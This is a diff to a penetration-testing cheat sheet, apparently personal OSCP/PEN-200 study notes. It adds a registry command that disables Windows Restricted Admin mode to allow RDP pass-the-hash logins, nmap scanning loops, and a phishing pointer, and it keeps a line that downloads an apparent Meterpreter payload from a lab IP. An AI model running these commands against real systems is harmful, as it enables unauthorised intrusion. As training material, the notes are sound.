@@ -27,6 +27,11 @@ exiftool -a -u brochure.pdf
 
 #### Windows
 
+When xfreerdp admin doesn't work
+```shell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
 PS - Get local user
 ```shell
 Get-LocalUser
@@ -62,8 +67,9 @@ Retrieve a file in Powershell (same as wget)
 iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
 ```
 
-
 | Enumerating | **Description** |
 | ---- | ---- |
 | `for i in $(cat ../internal-network.txt); do mkdir -p $i/nmap; nmap -p- --min-rate=10000 --open $i -oA "$i/nmap/quick-scan"; done` | Quick scan from scope file |
-|  |  |
+| `mkdir nmap`<br>`for i in $(cat scope.txt); do sudo nmap -p- --min-rate=10000 --open $i -oG nmap/$i; done`<br>`cd nmap`<br>`for i in $(ls \| grep -v '.nmap'); do extractPorts $i; export clipboard_content=`xclip -o -selection clipboard`; nmap -p $clipboard_content -sCV -A -T4 $i -oN "$i.nmap"; done` | Script to process scope.txt file |
+
+**Phising:** Refer to PEN-200 content, 24.3.2 module and use swaks
